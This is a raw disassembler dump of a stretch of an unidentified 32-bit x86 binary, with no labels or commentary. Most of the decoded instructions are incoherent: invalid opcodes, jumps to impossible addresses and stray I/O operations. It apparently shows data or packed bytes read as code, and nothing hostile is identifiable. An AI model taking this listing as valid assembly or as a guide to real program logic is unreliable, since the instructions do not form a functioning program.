  4120d6:	add    al,BYTE PTR [eax]
  4120d8:	hlt    
  4120d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120da:	add    al,0x0
  4120dc:	jmp    0xf9f92348
  4120e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120e2:	add    al,BYTE PTR [eax]
  4120e4:	stos   DWORD PTR es:[edi],eax
  4120e5:	scas   eax,DWORD PTR es:[edi]
  4120e6:	add    bh,BYTE PTR ds:0x2a0e9
  4120ec:	or     al,0xa3
  4120ee:	jp     0x412101
  4120f0:	jmp    0xe6032399
  4120f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120f6:	idiv   edi
  4120f8:	loopne 0x41209e
  4120fa:	add    bh,BYTE PTR [ebp-0x1f]
  4120fd:	mov    WORD PTR ds:0x44a4e900,ss
  412103:	add    ebp,ecx
  412105:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412106:	add    dl,BYTE PTR [eax]
  412108:	jmp    0x9148d8b1
  41210d:	cdq    
  41210e:	add    al,BYTE PTR [eax]
  412110:	jmp    0xfc41267b
  412115:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412116:	loop   0x412117
  412118:	call   0xd1f92304
  41211d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41211e:	add    al,BYTE PTR [eax]
  412120:	sub    eax,DWORD PTR [eax]
	...
  412136:	lahf   
  412137:	add    bh,BYTE PTR ds:0xfe39e4e9
  41213d:	xchg   esp,eax
  41213e:	lods   al,BYTE PTR ds:[esi]
  41213f:	jp     0x41215a
  412141:	jmp    0xee0323ea
  412146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412147:	idiv   edi
  412149:	push   0xe17d02ab
  41214e:	sbb    al,0x1e
  412150:	add    cl,ch
  412152:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412153:	inc    esp
  412154:	add    ebp,ecx
  412156:	xchg   ebp,eax
  412157:	dec    edx
  412158:	cmp    al,0xe9
  41215a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41215b:	add    eax,DWORD PTR [eax]
  41215d:	out    0x47,al
  41215f:	inc    edx
  412160:	mov    WORD PTR ds:0x8b18a2,ds
  412166:	aas    
  412167:	ret    
  412168:	add    al,BYTE PTR [eax]
  41216a:	int    0x7e
  41216c:	sbb    al,BYTE PTR [esi+ecx*2]
  41216f:	add    eax,0x8c6375ff
  412174:	jg     0x412186
  412176:	cmp    al,BYTE PTR ds:0x1dcf8900
  41217c:	add    al,0x0
  41217e:	dec    esi
  41217f:	inc    ebp
  412180:	lds    eax,FWORD PTR [ecx+0x142]
  412186:	ss add eax,0x7e970000
  41218c:	push   cs
  41218d:	add    al,0xe
  41218f:	add    eax,0xea7c83
  412194:	add    BYTE PTR [ebx+0x41d97],cl
	...
  4121ae:	add    BYTE PTR [esi],cl
  4121b0:	jno    0x4121bb
  4121b2:	mov    cl,BYTE PTR [edi]
  4121b4:	add    eax,eax
  4121b6:	(bad)  
  4121b7:	mov    esi,0xfac1ff8d
  4121bc:	add    al,0xd0
  4121be:	and    DWORD PTR [ecx+eax*1+0x194f8300],ecx
  4121c5:	add    al,0x0
  4121c7:	mov    esi,0x551d73f7
  4121cc:	jle    0x4121dc
  4121ce:	add    al,0xce
  4121d0:	add    al,0x89
  4121d2:	xor    DWORD PTR [esi-0x2000000],0xba1c7fbf
  4121dc:	add    al,0x0
  4121de:	or     BYTE PTR [esi+0xf890004],cl
  4121e4:	adc    al,0x4
  4121e6:	add    BYTE PTR [esi-0x73],bh
  4121e9:	xchg   DWORD PTR [eax],ebx
  4121eb:	jp     0x4121f1
  4121ed:	add    al,dl
  4121ef:	scas   eax,DWORD PTR es:[edi]
  4121f0:	rol    DWORD PTR [ecx+0x62da781],0x0
  4121f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121f8:	dec    eax
  4121f9:	mov    dh,0x1c
  4121fb:	sbb    al,0xab
  4121fd:	adc    eax,DWORD PTR [edi+eiz*4]
  412200:	sub    DWORD PTR [ecx+0x225bf80],ecx
  412206:	add    bh,ah
  412208:	pusha  
  412209:	sbb    BYTE PTR [ebx],0xa3
  41220c:	sub    DWORD PTR [edx],eax
  41220e:	or     BYTE PTR [edi+0x890229],ah
	...
  412228:	cmp    al,BYTE PTR es:[esi]
  41222b:	add    BYTE PTR [edi-0x5ce8755c],ah
  412231:	sub    DWORD PTR [edx],eax
  412233:	mov    ah,BYTE PTR [esi-0x1802bdd5]
  412239:	mov    eax,ds:0xde1cc302
  41223e:	out    0x3,eax
  412240:	sbb    al,0x76
  412242:	out    0x3,al
  412244:	pop    edx
  412245:	outs   dx,DWORD PTR ds:[esi]
  412246:	shl    DWORD PTR [edx],cl
  412248:	icebp  
  412249:	sahf   
  41224a:	retf   0x1dff
  41224d:	rol    BYTE PTR [eax+0x2c1aa6e6],cl
  412253:	inc    ebp
  412254:	xor    cl,BYTE PTR [esi-0x2d]
  412257:	sbb    bh,0x2a
  41225a:	mov    bl,0xef
  41225c:	and    al,0xf8
  41225e:	add    bh,BYTE PTR [ebp-0x1c31f38]
  412264:	xor    dl,BYTE PTR [edi+0x7c357409]
  41226a:	xchg   esi,edi
  41226c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41226d:	ret    0x41f
  412270:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412271:	sub    DWORD PTR [ebp+0x13aa2c18],esi
  412277:	add    al,0xa7
  412279:	sub    DWORD PTR [ecx+0x21daf80],ecx
  41227f:	add    bh,ah
  412281:	add    dh,BYTE PTR [eax+0x7a]
  412284:	pushf  
  412285:	(bad)  
  412286:	call   0xf8c2508e
  41228b:	pop    es
	...
  4122a0:	add    BYTE PTR [edi-0x6f7d9dfe],ah
  4122a6:	(bad)  
  4122a7:	call   0xe7857baf
  4122ac:	mov    bh,0xae
  4122ae:	mov    eax,ss
  4122b0:	add    DWORD PTR [eax+edi*1-0x57],ebp
  4122b4:	mov    esi,DWORD PTR [eax-0x5fac15d5]
  4122ba:	add    DWORD PTR [eax+0x1f],edx
  4122bd:	mov    ds:0x8fb6e902,eax
  4122c2:	mov    esp,DWORD PTR [edi+0x13]
  4122c5:	mov    ds:0x278ae902,eax
  4122ca:	sbb    ah,ch
  4122cc:	add    esp,DWORD PTR [edi-0x5385a03e]
  4122d2:	(bad)  
  4122d3:	call   0xf8c240db
  4122d8:	pop    es
  4122d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122da:	add    dh,BYTE PTR [edx-0x7e]
  4122dd:	nop
  4122de:	(bad)  
  4122df:	call   0xeb5b3fe7
  4122e4:	pop    eax
  4122e5:	jmp    0xe728:0x25291742
  4122ec:	mov    esi,DWORD PTR [eax-0x5827a553]
  4122f2:	imul   ecx,esp,0x9c02a707
  4122f8:	sbb    ch,BYTE PTR [ecx+eax*4]
  4122fb:	clc    
  4122fc:	pop    es
  4122fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122fe:	add    ah,BYTE PTR [eax-0x7e]
  412301:	cwde   
  412302:	(bad)  
  412303:	call   0x41230b
	...
  412318:	add    BYTE PTR [eax],al
  41231a:	mov    DWORD PTR [bx],edi
  41231d:	pop    ds
  41231e:	stos   DWORD PTR es:[edi],eax
  41231f:	add    ch,cl
  412321:	mov    ah,BYTE PTR [edi]
  412323:	adc    eax,DWORD PTR [eax]
  412325:	in     eax,dx
  412326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412327:	add    cl,BYTE PTR [ebx-0x15398]
  41232d:	call   0x554166e8
  412332:	test   eax,0xdaeb0f88
  412337:	aaa    
  412338:	shl    DWORD PTR [ecx-0x6d],0x29
  41233c:	add    DWORD PTR [ecx-0x2256fcb5],ebx
  412342:	pop    eax
  412343:	ss (bad) 
  412345:	cmp    al,0xb2
  412347:	mov    DWORD PTR [eax-0x1c9b727],eax
  41234d:	jo     0x412379
  41234f:	push   cs
  412350:	add    al,0xe9
  412352:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412353:	ret    0x5088
  412356:	(bad)  
  412357:	(bad)  
  412358:	(bad)  
  412359:	call   0xed50a679
  41235e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41235f:	add    cl,BYTE PTR [ebx-0x14490]
  412365:	call   0xfa005de
  41236a:	out    dx,al
  41236b:	inc    ebx
  41236c:	add    ebp,ecx
  41236e:	fxch   st(6)
  412370:	mov    cl,ch
  412372:	fadd   DWORD PTR ds:0xcc6b1a56
  412378:	or     BYTE PTR [esp+ebx*4-0x54],0x4
  41237d:	test   BYTE PTR [eax],al
	...
  412393:	lods   al,BYTE PTR ds:[esi]
  412394:	add    al,BYTE PTR [eax]
  412396:	jmp    0xdd64ddc4
  41239b:	and    DWORD PTR ds:0xa21e342a,ebp
  4123a1:	and    ebp,ecx
  4123a3:	xor    dl,BYTE PTR ds:0x15f74284
  4123a9:	mov    esp,DWORD PTR [eax+eiz*1]
  4123ac:	push   eax
  4123ad:	mov    WORD PTR [edx-0x5d],?
  4123b0:	add    al,BYTE PTR [eax]
  4123b2:	add    BYTE PTR [esi-0x7f8be7c9],cl
  4123b8:	inc    esi
  4123b9:	inc    eax
  4123ba:	test   edi,eax
  4123bc:	jae    0x4123b2
  4123be:	cmp    DWORD PTR [esi-0x1c367aff],0x6
  4123c5:	add    eax,0xffffff8c
  4123c8:	in     al,0x1
  4123ca:	cmp    DWORD PTR [esi],0x0
  4123cd:	inc    edi
  4123ce:	inc    esi
  4123cf:	std    
  4123d0:	pop    ebp
  4123d1:	and    bl,BYTE PTR [edi+ecx*2]
  4123d4:	jb     0x4123a2
  4123d6:	pop    edi
  4123d7:	mov    eax,0x4ac2595b
  4123dc:	add    DWORD PTR [ebx+0x5502a254],ecx
  4123e2:	push   esi
  4123e3:	mov    ch,0xee
  4123e5:	lds    eax,FWORD PTR [esi-0x1caaa]
  4123eb:	add    DWORD PTR ds:[eax],eax
  4123ee:	add    ah,al
  4123f0:	pop    es
  4123f1:	test   cl,cl
  4123f3:	sbb    DWORD PTR [ebp+0x12e],esi
	...
  412409:	add    BYTE PTR [eax],al
  41240b:	add    BYTE PTR [esi],cl
  41240d:	add    DWORD PTR [edi-0x75],edx
  412410:	sbb    dl,BYTE PTR [ebp+0x12]
  412413:	cmp    DWORD PTR [ecx+0x8],0x76
  412417:	add    eax,0x849
  41241c:	push   cs
  41241d:	test   al,al
  41241f:	sub    eax,ecx
  412421:	xchg   ecx,eax
  412422:	cmp    BYTE PTR [eax],cl
  412424:	rol    BYTE PTR [esi+0x4d],cl
  412427:	inc    eax
  412428:	push   ebx
  412429:	clc    
  41242a:	jae    0x412422
  41242c:	dec    ebp
  41242d:	sbb    DWORD PTR [edx],0x4
  412430:	mov    esi,0xdb75ff00
  412435:	add    DWORD PTR [eax+edx*1-0x76ffff2e],0x40
  41243d:	sbb    DWORD PTR [eax+eax*1],eax
  412440:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412441:	sub    eax,edx
  412443:	(bad)  
  412444:	and    DWORD PTR [edi],esp
  412446:	(bad)  
  412447:	jmp    DWORD PTR [eax-0x58fffdce]
  41244d:	mov    dl,0x80
  41244f:	bts    DWORD PTR [ecx],ebp
  412452:	add    cl,BYTE PTR [ebx-0x1addf]
  412458:	cmp    BYTE PTR [edx-0x1d],0x8a
  41245c:	and    DWORD PTR [edx],edi
  41245e:	(bad)  
  41245f:	push   DWORD PTR [eax-0x60]
  412462:	or     eax,0x37221f5f
  412467:	test   DWORD PTR [edi-0x6fffddb],esi
  41246d:	push   ss
  41246e:	inc    esi
  41246f:	pop    es
	...
  412484:	add    BYTE PTR [edi+0xf7338a6],ah
  41248a:	test   eax,0xaba6fe4a
  41248f:	pop    ss
  412490:	add    al,0xa7
  412492:	sub    DWORD PTR [ebp+0x1b169e68],eax
  412498:	mov    esp,DWORD PTR [ecx]
  41249a:	cmp    bh,dh
  41249c:	jmp    DWORD PTR [eax]
  41249e:	mov    bl,0x81
  4124a0:	pop    ss
  4124a1:	mov    ds:0x1e400229,eax
  4124a6:	mov    esp,0x29a70417
  4124ab:	mov    DWORD PTR [ebp+0x22597],eax
  4124b1:	sub    al,0x9c
  4124b3:	sbb    eax,DWORD PTR [edi+eiz*4]
  4124b6:	sub    DWORD PTR [edi+ecx*1-0x3ec6085b],ecx
  4124bd:	das    
  4124be:	pop    edx
  4124bf:	add    DWORD PTR [esi+0x21dbb],ecx
  4124c5:	pop    edx
  4124c6:	push   edx
  4124c7:	mov    eax,DWORD PTR [ebp+0x21db7]
  4124cd:	add    ebp,DWORD PTR cs:[edi+0x1c]
  4124d1:	mov    ds:0x1fc3e902,eax
  4124d6:	gs hlt 
  4124d8:	jmp    FWORD PTR [eax-0x4f7da0cd]
  4124de:	(bad)  
  4124df:	call   0xe0bd50e7
  4124e4:	call   DWORD PTR [eax+0x146233]
	...
  4124fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124ff:	push   eax
  412500:	out    dx,al
  412501:	inc    ebp
  412502:	sub    BYTE PTR [edx],dl
  412504:	call   0xe93fc192
  412509:	add    edi,edx
  41250b:	sbb    DWORD PTR [edx-0x7f],esp
  41250e:	cwde   
  41250f:	(bad)  
  412510:	call   0xe0bd5318
  412515:	call   FWORD PTR [eax+0x33]
  412518:	sub    BYTE PTR [ebx+0x3ed1602],cl
  41251e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41251f:	mov    DWORD PTR [esi+0x13],esp
  412522:	stos   DWORD PTR es:[edi],eax
  412523:	add    ch,cl
  412525:	mov    WORD PTR [edx],fs
  412527:	sbb    ah,ch
  412529:	add    esp,DWORD PTR [edi+0x5e05e088]
  41252f:	xor    al,0xa7
  412531:	mov    ecx,?
  412533:	ficomp WORD PTR [ebx+0x71d0a08b]
  412539:	dec    ecx
  41253a:	or     BYTE PTR [ecx+0x74],bl
  41253d:	cmp    BYTE PTR [ecx],cl
  41253f:	xchg   DWORD PTR [ebp-0x47021f7c],esp
  412545:	mov    edx,gs
  412547:	sub    DWORD PTR [edi+esi*1],ebp
  41254a:	icebp  
  41254b:	xor    ah,BYTE PTR [ecx+0x48]
  41254e:	and    eax,0x2dd2ea21
  412553:	inc    esp
  412554:	push   eax
  412555:	js     0x412533
  412557:	xor    bh,BYTE PTR ds:0xc984
  41255d:	sahf   
  41255e:	sbb    eax,DWORD PTR [ebp-0x19]
  412561:	jne    0x412563
	...
  412577:	js     0x4125ad
  412579:	inc    dh
  41257b:	(bad)  
  41257d:	shl    ecx,0xa4
  412580:	jg     0x41254a
  412582:	push   ss
  412583:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412584:	test   BYTE PTR [ebx],bl
  412586:	in     eax,0xa4
  412588:	add    cl,BYTE PTR [ebp+0x18b7ad90]
  41258e:	jb     0x4125b6
  412590:	add    al,BYTE PTR [ecx+ebp*8]
  412593:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412594:	jnp    0x41251b
  412596:	rol    DWORD PTR [eax+0x2a29fe32],1
  41259c:	pusha  
  41259d:	sbb    esp,ebp
  41259f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125a0:	add    cl,BYTE PTR [ecx+0x6936f]
  4125a6:	jmp    0xed58add8
  4125ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125ac:	add    cl,BYTE PTR [edx-0x2ab5927]
  4125b2:	stos   DWORD PTR es:[edi],eax
  4125b3:	sbb    eax,DWORD PTR [edx]
  4125b5:	add    DWORD PTR [edi-0x61],ebx
  4125b8:	push   es
  4125b9:	add    cl,ch
  4125bb:	test   DWORD PTR [edx],0x69b678b
  4125c1:	add    cl,ch
  4125c3:	sbb    ecx,DWORD PTR [eax+0x2a4e517]
  4125c9:	inc    eax
  4125ca:	jo     0x41254d
  4125cc:	or     eax,0x7ba4e904
  4125d1:	test   ecx,ebx
  4125d3:	or     BYTE PTR [edx],dh
  4125d5:	(bad)  
  4125d6:	bound  eax,QWORD PTR [ecx+0xe90419]
	...
  4125f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125f1:	jl     0x412602
  4125f3:	jmp    0x41264b
  4125f5:	das    
  4125f6:	shl    DWORD PTR [ecx-0x6d],0x3
  4125fa:	mov    gs,ebp
  4125fc:	loopne 0x41262f
  4125fe:	inc    BYTE PTR [eax]
  412600:	sbb    ecx,DWORD PTR [edi]
  412602:	mov    eax,DWORD PTR [esi-0x1ce12]
  412608:	inc    edi
  412609:	mov    al,0x16
  41260b:	add    al,0xce
  41260d:	add    eax,0xa508940
  412612:	add    al,0x0
  412614:	mov    esi,0xba10847e
  412619:	add    eax,0xf088b00
  41261e:	add    al,0x0
  412620:	mov    ?,WORD PTR [ebx+0xe]
  412623:	add    ch,BYTE PTR [eax+edi*8+0x66e88c0]
  41262a:	mov    ds,WORD PTR [edx+ecx*4]
  41262d:	add    eax,0x7da77500
  412632:	test   BYTE PTR [eax],dl
  412634:	mov    al,BYTE PTR ds:0xdf88900
  41263a:	add    al,0x0
  41263c:	dec    esi
  41263d:	inc    ebp
  41263e:	xchg   DWORD PTR [esi-0x1cebe],ebp
  412644:	xlat   BYTE PTR ds:[ebx]
  412645:	scas   eax,DWORD PTR es:[edi]
  412646:	push   cs
  412647:	add    al,0x3e
  412649:	add    eax,0x3156868b
  41264e:	(bad)  
  41264f:	(bad)  
  412650:	(bad)  
  412651:	and    al,0xff
  412653:	lea    eax,[eax]
	...
  412669:	xor    dh,BYTE PTR [ecx]
  41266b:	(bad)  
  41266c:	dec    DWORD PTR [ebx+0x1e868b0f]
  412672:	xor    esi,edi
  412674:	call   DWORD PTR [edi-0x1fbe951]
  41267a:	add    al,0x40
  41267c:	mov    DWORD PTR [eax+0x19],esp
  41267f:	add    al,0x0
  412681:	push   cs
  412682:	jle    0x412608
  412684:	adc    BYTE PTR [edx],cl
  412686:	add    eax,0xd888b00
  41268b:	add    al,0x0
  41268d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41268e:	sbb    edx,DWORD PTR [edx+0x1f]
  412691:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412692:	rcl    DWORD PTR [esi],1
  412694:	add    al,0xa7
  412696:	sbb    ebp,DWORD PTR [edi+0x12a91c18]
  41269c:	add    al,0xa7
  41269e:	sbb    ecx,DWORD PTR [ebx+0x2279f85]
  4126a4:	add    BYTE PTR [edi-0x4e],ah
  4126a7:	sbb    ebp,DWORD PTR fs:[ebx+0x2189021b]
  4126ae:	sub    edi,esi
  4126b0:	jmp    DWORD PTR [eax-0x5ce8835b]
  4126b6:	sbb    DWORD PTR [edx],eax
  4126b8:	rol    bh,1
  4126ba:	sbb    al,BYTE PTR [ebx+ebx*1+0x750219a3]
  4126c1:	sahf   
  4126c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126c3:	jl     0x4126d4
  4126c5:	mov    ds:0x29890219,eax
  4126ca:	add    al,BYTE PTR [eax]
	...
  4126e0:	add    BYTE PTR [eax],al
  4126e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126e3:	(bad)  [edx+0x225c3ad]
  4126e9:	add    BYTE PTR [esi],ch
  4126eb:	mov    al,ds:0x19a70413
  4126f0:	xchg   DWORD PTR [ebp+0x21daf],esi
  4126f6:	push   edi
  4126f7:	or     dh,dl
  4126f9:	pop    esp
  4126fa:	xor    al,BYTE PTR gs:[edx]
  4126fd:	mov    ebp,ebx
  4126ff:	inc    ebp
  412700:	(bad)  
  412701:	push   ebp
  412702:	shl    BYTE PTR [edi+esi*4+0x32a4b723],1
  412709:	cmp    al,0x27
  41270b:	sbb    al,BYTE PTR [edx]
  41270d:	add    BYTE PTR [ebp+ecx*2+0x2ca3fe7f],dl
  412714:	or     edi,DWORD PTR [ebx]
  412716:	sub    DWORD PTR [esi-0x2],eax
  412719:	(bad)  
  41271a:	clc    
  41271b:	add    bl,ch
  41271d:	iret   
  41271e:	stc    
  41271f:	dec    edx
  412720:	add    DWORD PTR [ebp+eiz*1+0x23],eax
  412724:	out    dx,al
  412725:	aam    0x25
  412727:	inc    ebx
  412728:	jecxz  0x4126ff
  41272a:	out    0xfa,al
  41272c:	call   0xe5285229
  412731:	add    esp,DWORD PTR [edi+0x40f6f3b6]
  412737:	add    ch,cl
  412739:	add    esi,DWORD PTR [eax*1+0x1ba6256a]
  412740:	clc    
  412741:	imul   BYTE PTR [eax+0x3e906]
	...
  41275b:	adc    eax,0x98f69e02
  412760:	scas   al,BYTE PTR es:[edi]
  412761:	call   0xae433c69
  412766:	inc    edx
  412767:	cmp    dl,0x99
  41276a:	add    BYTE PTR [eax+0x3],0x99
  41276e:	sub    eax,edx
  412770:	sub    al,0xe5
  412772:	xor    al,0xd9
  412774:	jnp    0x412724
  412776:	mov    BYTE PTR [eax+0x1a],dl
  412779:	hlt    
  41277a:	cmp    DWORD PTR [ecx+0x2f],esp
  41277d:	pop    ebx
  41277e:	mov    edi,0xd521fcb0
  412783:	repnz inc esp
  412785:	lock add esi,eax
  412788:	sbb    ah,ah
  41278a:	cmp    DWORD PTR [ecx+0x2f],eax
  41278d:	or     eax,0x4705f881
  412792:	inc    edx
  412793:	test   al,0x2
  412795:	cmp    cl,BYTE PTR [ecx-0x311f1934]
  41279b:	jp     0x412818
  41279d:	xchg   edi,eax
  41279e:	sbb    BYTE PTR [edx-0x26],0xec
  4127a2:	add    esp,DWORD PTR [edi+0x23051602]
  4127a8:	or     eax,DWORD PTR [eax]
  4127aa:	call   0x72c22a53
  4127af:	and    al,0x2f
  4127b1:	(bad)  
  4127b2:	jmp    0xddc3e9ee
  4127b7:	enter  0x416,0xda
  4127bb:	fisub  WORD PTR [esi]
  4127bd:	ss push edx
	...
  4127d3:	add    BYTE PTR [ebx+0x7c378a30],dl
  4127d9:	(bad)  
  4127db:	ds xchg ebx,eax
  4127dd:	jl     0x4127ac
  4127df:	inc    ecx
  4127e0:	jle    0x41280b
  4127e2:	(bad)  
  4127e3:	cs cs ret 
  4127e6:	and    eax,DWORD PTR [ecx]
  4127e8:	push   ds
  4127e9:	xchg   ebp,eax
  4127ea:	pmulhw mm4,QWORD PTR [edx+eax*1+0x380228a]
  4127f2:	add    ah,BYTE PTR [eax]
  4127f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127f5:	inc    ebx
  4127f6:	pop    esi
  4127f7:	jno    0x41279f
  4127f9:	sub    eax,0x2e88d985
  4127fe:	(bad)  
  4127ff:	pusha  
  412800:	sbb    ah,dl
  412802:	add    ebp,ecx
  412804:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412805:	int3   
  412806:	pop    esp
  412807:	inc    edx
  412808:	jmp    0xe4ab2812
  41280d:	sub    al,0x0
  41280f:	xchg   edi,eax
  412810:	mov    bh,0x6
  412812:	add    cl,ch
  412814:	daa    
  412815:	popf   
  412816:	or     BYTE PTR [edx+eiz*4],bh
  412819:	jns    0x4127a0
  41281b:	fldenv [eax+0x2d600002]
  412821:	push   ss
  412822:	add    al,0xe9
  412824:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412825:	ret    0x5788
  412828:	xchg   edi,eax
  412829:	push   es
  41282a:	add    cl,ch
  41282c:	stos   DWORD PTR es:[edi],eax
  41282d:	xchg   DWORD PTR [edi],ecx
  41282f:	in     eax,dx
  412830:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412831:	add    cl,BYTE PTR [ebx+0x6ab67]
	...
  41284b:	add    BYTE PTR [eax],al
  41284d:	(bad)  
  41284e:	scas   eax,DWORD PTR es:[edi]
  41284f:	push   es
  412850:	add    dl,BYTE PTR [edi-0xf]
  412853:	mov    edi,0xbe070688
  412858:	sbb    al,0x2
  41285a:	add    al,BYTE PTR [eax]
  41285c:	jne    0x412805
  41285e:	lods   eax,DWORD PTR ds:[esi]
  41285f:	test   BYTE PTR [eax],dl
  412861:	add    al,BYTE PTR [edx]
  412863:	add    BYTE PTR [ecx+0x3fe50],cl
  412869:	into   
  41286a:	inc    ecx
  41286b:	xchg   DWORD PTR [esi+0x5ca],ebp
  412871:	push   edi
  412872:	js     0x412882
  412874:	add    al,0xce
  412876:	add    DWORD PTR [ebx+0x5d686],ecx
  41287c:	add    BYTE PTR [esi+0x26],ch
  41287f:	mov    ebx,edx
  412881:	jg     0x41288f
  412883:	pop    es
  412884:	or     esp,0x4
  412887:	push   edx
  412888:	mov    edi,DWORD PTR [eax-0x560537f2]
  41288e:	icebp  
  41288f:	mov    DWORD PTR [esi+0x56e],eax
  412895:	push   es
  412896:	push   DWORD PTR [edi+0x18e01]
  41289c:	add    DWORD PTR [eax],eax
  41289e:	adc    al,BYTE PTR [eax+eax*1]
  4128a1:	jle    0x412851
  4128a3:	pushf  
  4128a4:	and    al,0x52
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	xor    DWORD PTR [ebp-0x7f],0x743efffe
  4128af:	push   ss
  4128b0:	add    DWORD PTR [eax],0x0
	...
  4128c3:	add    BYTE PTR [eax],al
  4128c5:	add    dl,bl
  4128c7:	sbb    dl,BYTE PTR [esi]
  4128c9:	add    al,ch
  4128cb:	ins    DWORD PTR es:[edi],dx
  4128cc:	and    bl,BYTE PTR [eax]
  4128ce:	lahf   
  4128cf:	lods   eax,DWORD PTR ds:[esi]
  4128d0:	int3   
  4128d1:	call   0x3f0887
  4128d6:	imul   edx,DWORD PTR [eax+0x5b],0xfa59a75b
  4128dd:	jmp    DWORD PTR [edi]
  4128df:	nop
  4128e0:	add    al,BYTE PTR ds:0x3b41ba7
  4128e6:	mov    esi,0x2617e7e7
  4128eb:	mov    al,0x2
  4128ed:	jge    0x412896
  4128ef:	sbb    esi,DWORD PTR [ebx+eax*1+0x17e65fbe]
  4128f6:	sbb    al,0x5f
  4128f8:	out    0x17,al
  4128fa:	jbe    0x41289c
  4128fc:	inc    eax
  4128fd:	out    0x4b,eax
  4128ff:	shl    DWORD PTR [ecx],1
  412901:	(bad)  
  412902:	jo     0x412969
  412904:	iret   
  412905:	pop    edx
  412906:	in     eax,0x32
  412908:	add    al,bh
  41290a:	sub    DWORD PTR [ebx],eax
  41290c:	or     BYTE PTR [eax],al
  41290e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41290f:	sbb    al,BYTE PTR [edx]
  412911:	add    BYTE PTR [edi-0x5880d266],ah
  412917:	sbb    eax,DWORD PTR [edx]
  412919:	jae    0x412909
  41291b:	cwde   
  41291c:	scas   al,BYTE PTR es:[edi]
  41291d:	and    edi,DWORD PTR [edi-0x33be4adb]
  412923:	mov    ds:0x19a703e6,eax
  412928:	mov    dh,0x39
	...
  41293e:	add    BYTE PTR [edi+0x78fe2c20],cl
  412944:	mov    eax,ds:0x1fa4e740
  412949:	xor    dh,bh
  41294b:	sbb    al,0x5c
  41294d:	sbb    ecx,esp
  41294f:	pop    esi
  412950:	push   ebp
  412951:	xor    BYTE PTR [ecx-0x74f3fa1d],cl
  412957:	and    DWORD PTR [edx+0x6],ecx
  41295a:	add    BYTE PTR [edi-0x59dcab51],ah
  412960:	pop    ss
  412961:	push   esp
  412962:	add    DWORD PTR [ebp-0x3],esp
  412965:	jnp    0x412967
  412967:	xor    BYTE PTR [ebx],al
  412969:	outs   dx,DWORD PTR ds:[esi]
  41296a:	adc    al,0xa3
  41296c:	add    ch,cl
  41296e:	jp     0x4129b2
  412970:	out    0xec,eax
  412972:	add    esp,DWORD PTR [edi-0x1932d434]
  412978:	cli    
  412979:	call   0xe76d0302
  41297e:	jno    0x41291c
  412980:	push   es
  412981:	jmp    0xdfdd5389
  412986:	mov    dh,0x8f
  412988:	ja     0x4129f8
  41298a:	adc    al,0xa3
  41298c:	add    ch,cl
  41298e:	jp     0x4129ba
  412990:	or     ebp,ebp
  412992:	add    esp,DWORD PTR [edi-0x539da03e]
  412998:	push   es
  412999:	jmp    0xd8c647a1
  41299e:	pop    es
  41299f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129a0:	add    ah,BYTE PTR [edx-0x76]
	...
  4129b7:	add    BYTE PTR [eax+0x1d03e906],dl
  4129bd:	adc    ebp,ebx
  4129bf:	push   ebp
  4129c0:	stos   BYTE PTR es:[edi],al
  4129c1:	inc    eax
  4129c2:	jo     0x4129d8
  4129c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129c5:	ins    BYTE PTR es:[edi],dx
  4129c6:	hlt    
  4129c7:	pop    es
  4129c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129c9:	add    dl,BYTE PTR [edx+ecx*1+0x7d8841c]
  4129d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129d1:	add    dh,BYTE PTR [eax-0x76]
  4129d4:	cwde   
  4129d5:	push   es
  4129d6:	jmp    0x3ebb10de
  4129db:	adc    BYTE PTR [ebx+0x227ae902],ch
  4129e1:	adc    ah,ch
  4129e3:	add    esp,DWORD PTR [edi-0x5cf49189]
  4129e9:	add    ch,cl
  4129eb:	push   ebx
  4129ec:	mov    al,0xe7
  4129ee:	out    0xa4,ax
  4129f1:	add    ch,cl
  4129f3:	mov    bh,0xb6
  4129f5:	ja     0x4129f6
  4129f7:	test   eax,0x6a0723e5
  4129fc:	in     al,0x0
  4129fe:	push   eax
  4129ff:	xchg   ecx,eax
  412a00:	push   cs
  412a01:	sub    bh,dh
  412a03:	sahf   
  412a04:	mov    ds:0xa4ed0f7d,eax
  412a09:	add    cl,BYTE PTR [eax+0x27cf0]
